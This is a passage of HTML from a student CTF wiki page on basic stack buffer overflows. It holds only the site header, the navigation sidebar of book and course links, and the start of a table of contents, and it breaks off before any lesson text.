
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Wiki project for COMPASS CTF, for usage of information sharing, collection, and reference. The contents are contributed by the students of COMPASS CTF team.">
      
      
      
        <link rel="canonical" href="https://wiki.compass.college/CS315/Week%202/">
      
      <link rel="icon" href="../../assets/favicon.ico">
      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.2.5">
    
    
      
        <title>Week 2 PWN: Basic Buffer Overflow - COMPASS CTF Wiki</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.2d9f7617.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.e6a45f82.min.css">
        
          
          
          <meta name="theme-color" content="#ef5552">
        
      
    
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Oswald:300,300i,400,400i,700,700i%7CConsolas:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Oswald";--md-code-font:"Consolas"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="orange">
  
    
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#week-2-pwn-basic-buffer-overflow" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--lifted" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="COMPASS CTF Wiki" class="md-header__button md-logo" aria-label="COMPASS CTF Wiki" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 89 89">
  <path d="M3.136,17.387l0,42.932l42.932,21.467l-42.932,-64.399Z" />
  <path d="M21.91,8l42.933,64.398l-18.775,9.388l-42.932,-64.399l18.774,-9.387Z" style="fill-opacity: 0.5" />
  <path d="M67.535,17.387l-27.262,18.156l21.878,32.818l5.384,2.691l0,-53.665Z" />
  <path d="M67.535,17.387l0,53.666l18.774,-9.388l0,-53.665l-18.774,9.387Z" style="fill-opacity: 0.25" />
</svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            COMPASS CTF Wiki
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Week 2 PWN: Basic Buffer Overflow
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08z"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/lyther/wiki/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    lyther/wiki
  </div>
</a>
      </div>
    
  </nav>
  
    
      
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../.." class="md-tabs__link">
        Abstract
      </a>
    </li>
  

      
        
  
  


  
  
  
    

  
  
  
    <li class="md-tabs__item">
      <a href="../../Book/Computer%20and%20System/Android%20Dalvik%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BB%93%E6%9E%84%E5%8F%8A%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/" class="md-tabs__link">
        Book
      </a>
    </li>
  

  

      
        
  
  
    
  


  
  
  
    <li class="md-tabs__item">
      <a href="../Overview/" class="md-tabs__link md-tabs__link--active">
        CS315
      </a>
    </li>
  

      
        
  
  


  
  
  
    

  
  
  
    <li class="md-tabs__item">
      <a href="../../Paper/Artificial%20Intelligence/Cert-RNN%20Towards%20Certifying%20the%20Robustness%20of%20Recurrent/" class="md-tabs__link">
        Paper
      </a>
    </li>
  

  

      
        
  
  


  
  
  
    

  
  
  
    <li class="md-tabs__item">
      <a href="../../Tool/Cryptography/SageMathCell/" class="md-tabs__link">
        Tool
      </a>
    </li>
  

  

      
        
  
  


  
  
  
    

  
  
  
    <li class="md-tabs__item">
      <a href="../../Tutorial/Material/Binary%20Exploitation/" class="md-tabs__link">
        Tutorial
      </a>
    </li>
  

  

      
        
  
  


  
  
  
    

  
  
  
    <li class="md-tabs__item">
      <a href="../../Website/Forum/kanxue/" class="md-tabs__link">
        Website
      </a>
    </li>
  

  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../Writeup/" class="md-tabs__link">
        Writeup
      </a>
    </li>
  

      
    </ul>
  </div>
</nav>
    
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="COMPASS CTF Wiki" class="md-nav__button md-logo" aria-label="COMPASS CTF Wiki" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 89 89">
  <path d="M3.136,17.387l0,42.932l42.932,21.467l-42.932,-64.399Z" />
  <path d="M21.91,8l42.933,64.398l-18.775,9.388l-42.932,-64.399l18.774,-9.387Z" style="fill-opacity: 0.5" />
  <path d="M67.535,17.387l-27.262,18.156l21.878,32.818l5.384,2.691l0,-53.665Z" />
  <path d="M67.535,17.387l0,53.666l18.774,-9.388l0,-53.665l-18.774,9.387Z" style="fill-opacity: 0.25" />
</svg>

    </a>
    COMPASS CTF Wiki
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/lyther/wiki/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    lyther/wiki
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1" type="checkbox" id="__nav_1" >
      
      
      
      
        <label class="md-nav__link" for="__nav_1">
          Abstract
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Abstract" data-md-level="1">
        <label class="md-nav__title" for="__nav_1">
          <span class="md-nav__icon md-icon"></span>
          Abstract
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        COMPASS CTF
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../member/" class="md-nav__link">
        Members
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../award/" class="md-nav__link">
        Competition Awards
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../related/" class="md-nav__link">
        Related Links
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1_5" type="checkbox" id="__nav_1_5" >
      
      
      
      
        <label class="md-nav__link" for="__nav_1_5">
          Meeting
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Meeting" data-md-level="2">
        <label class="md-nav__title" for="__nav_1_5">
          <span class="md-nav__icon md-icon"></span>
          Meeting
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Meeting/CTF%20Week%20Meeting%202022-02-17/" class="md-nav__link">
        CTF Week Meeting 2022-02-17
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Meeting/CTF%20Week%20Meeting%202022-02-24/" class="md-nav__link">
        CTF Week Meeting 2022-02-24
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Meeting/CTF%20Week%20Meeting%202022-03-03/" class="md-nav__link">
        CTF Week Meeting 2022-03-03
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Meeting/CTF%20Week%20Meeting%202022-03-10/" class="md-nav__link">
        CTF Week Meeting 2022-03-10
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Meeting/CTF%20Week%20Meeting%202022-03-17/" class="md-nav__link">
        CTF Week Meeting 2022-03-17
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2">
          Book
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Book" data-md-level="1">
        <label class="md-nav__title" for="__nav_2">
          <span class="md-nav__icon md-icon"></span>
          Book
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_1" type="checkbox" id="__nav_2_1" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2_1">
          Computer and System
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Computer and System" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_1">
          <span class="md-nav__icon md-icon"></span>
          Computer and System
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Computer%20and%20System/Android%20Dalvik%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BB%93%E6%9E%84%E5%8F%8A%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/" class="md-nav__link">
        Android Dalvik虚拟机结构及机制剖析
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Computer%20and%20System/Android%20Internals/" class="md-nav__link">
        Android Internals: Power User's View
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Computer%20and%20System/Android%E7%B3%BB%E7%BB%9F%E6%BA%90%E4%BB%A3%E7%A0%81%E6%83%85%E6%99%AF%E5%88%86%E6%9E%90/" class="md-nav__link">
        Android系统源代码情景分析
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Computer%20and%20System/Code/" class="md-nav__link">
        Code: The Hidden Language of Computer Hardware and Software
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Computer%20and%20System/Computer%20Systems/" class="md-nav__link">
        Computer Systems: A Programmer's Perspective
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Computer%20and%20System/Linux%20Kernel%20Development/" class="md-nav__link">
        Linux Kernel Development
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Computer%20and%20System/Mac%20OS%20X%20and%20iOS%20Internals/" class="md-nav__link">
        Mac OS X and iOS Internals: To the Apple’s Core
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Computer%20and%20System/Understanding%20the%20Linux%20Kernel/" class="md-nav__link">
        Understanding the Linux Kernel
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Computer%20and%20System/Windows%20Internals/" class="md-nav__link">
        Windows Internals
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Computer%20and%20System/%E4%BB%A3%E7%A0%81%E6%8F%AD%E7%A7%98/" class="md-nav__link">
        代码揭秘
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Computer%20and%20System/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Android%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E6%80%9D%E6%83%B3/" class="md-nav__link">
        深入理解Android内核设计思想
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_2" type="checkbox" id="__nav_2_2" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2_2">
          Cryptography
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Cryptography" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_2">
          <span class="md-nav__icon md-icon"></span>
          Cryptography
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Cryptography/Foundations%20of%20Cryptography/" class="md-nav__link">
        Foundations of Cryptography
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Cryptography/Introduction%20to%20Modern%20Cryptography/" class="md-nav__link">
        Introduction to Modern Cryptography: Principles and Protocols
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Cryptography/Understanding%20Cryptography/" class="md-nav__link">
        Understanding Cryptography: A Textbook for Students and Practitioners
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Cryptography/%E5%9B%BE%E8%A7%A3%E5%AF%86%E7%A0%81%E6%8A%80%E6%9C%AF/" class="md-nav__link">
        图解密码技术
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_3" type="checkbox" id="__nav_2_3" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2_3">
          Network
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Network" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_3">
          <span class="md-nav__icon md-icon"></span>
          Network
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Network/Computer%20Networking/" class="md-nav__link">
        Computer Networking: A Top-Down Approach
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Network/Practical%20Packet%20Analysis/" class="md-nav__link">
        Practical Packet Analysis: Using Wireshark to Solve Real-World Network Problems
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Network/TCP%20IP%20Illustrated/" class="md-nav__link">
        TCP/IP Illustrated
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_4" type="checkbox" id="__nav_2_4" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2_4">
          Programming
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Programming" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_4">
          <span class="md-nav__icon md-icon"></span>
          Programming
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_4_1" type="checkbox" id="__nav_2_4_1" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2_4_1">
          C
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="C" data-md-level="3">
        <label class="md-nav__title" for="__nav_2_4_1">
          <span class="md-nav__icon md-icon"></span>
          C
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Programming/C/C%20Primer%20Plus/" class="md-nav__link">
        C Primer Plus (Developer's Library)
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Programming/C/C%20Programming%20Language/" class="md-nav__link">
        C Programming Language, 2nd Edition
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Programming/C/C%20Traps%20and%20Pitfalls/" class="md-nav__link">
        C Traps and Pitfalls
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Programming/C/Expert%20C%20Programming%20Deep%20C%20Secrets/" class="md-nav__link">
        Expert C Programming: Deep C Secrets
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Programming/C/Pointers%20on%20C/" class="md-nav__link">
        Pointers on C
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_4_2" type="checkbox" id="__nav_2_4_2" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2_4_2">
          C++
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="C++" data-md-level="3">
        <label class="md-nav__title" for="__nav_2_4_2">
          <span class="md-nav__icon md-icon"></span>
          C++
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Programming/C%2B%2B/C%2B%2B%20Primer%20Plus/" class="md-nav__link">
        C++ Primer Plus
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Programming/C%2B%2B/C%2B%2B%20Primer/" class="md-nav__link">
        C++ Primer
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_5" type="checkbox" id="__nav_2_5" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2_5">
          PWN
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="PWN" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_5">
          <span class="md-nav__icon md-icon"></span>
          PWN
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/PWN/Practical%20Malware%20Analysis/" class="md-nav__link">
        Practical Malware Analysis
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/PWN/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/" class="md-nav__link">
        加密与解密
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/PWN/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/" class="md-nav__link">
        逆向工程核心原理
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_6" type="checkbox" id="__nav_2_6" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2_6">
          Security
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Security" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_6">
          <span class="md-nav__icon md-icon"></span>
          Security
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Security/0day%E5%AE%89%E5%85%A8/" class="md-nav__link">
        0day安全：软件漏洞分析技术
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Security/A%20Guide%20to%20Kernel%20Exploitation/" class="md-nav__link">
        A Guide to Kernel Exploitation: Attacking the Core
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Security/Fuzzing%20for%20Software%20Security%20Testing%20and%20Quality%20Assurance/" class="md-nav__link">
        Fuzzing for Software Security Testing and Quality Assurance (Artech House Information Security and Privacy)
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Security/Gray%20Hat%20Hacking/" class="md-nav__link">
        Gray Hat Hacking The Ethical Hackers Handbook
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Security/Rootkit/" class="md-nav__link">
        The Rootkit Arsenal: Escape and Evasion: Escape and Evasion in the Dark Corners of the System
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Book/Security/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/" class="md-nav__link">
        漏洞战争：软件漏洞分析精要
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" checked>
      
      
      
      
        <label class="md-nav__link" for="__nav_3">
          CS315
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="CS315" data-md-level="1">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          CS315
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Overview/" class="md-nav__link">
        Overview
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Week%201/" class="md-nav__link">
        Week 1 CTF Introduction and Forensics
      </a>
    </li>
  

            
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          Week 2 PWN: Basic Buffer Overflow
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        Week 2 PWN: Basic Buffer Overflow
      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#binary-exploitation" class="md-nav__link">
    Binary Exploitation
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#buffers" class="md-nav__link">
    Buffers
  </a>
  
    <nav class="md-nav" aria-label="Buffers">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploits" class="md-nav__link">
    Exploits
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#introduction-to-stack" class="md-nav__link">
    Introduction to Stack
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#buffer-overflow" class="md-nav__link">
    Buffer Overflow
  </a>
  
    <nav class="md-nav" aria-label="Buffer Overflow">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#stack-buffer-overflow" class="md-nav__link">
    Stack buffer overflow
  </a>
  
    <nav class="md-nav" aria-label="Stack buffer overflow">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#passing-an-impossible-check" class="md-nav__link">
    Passing an impossible check
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#going-one-step-further" class="md-nav__link">
    Going one step further
  </a>
  
</li>
        
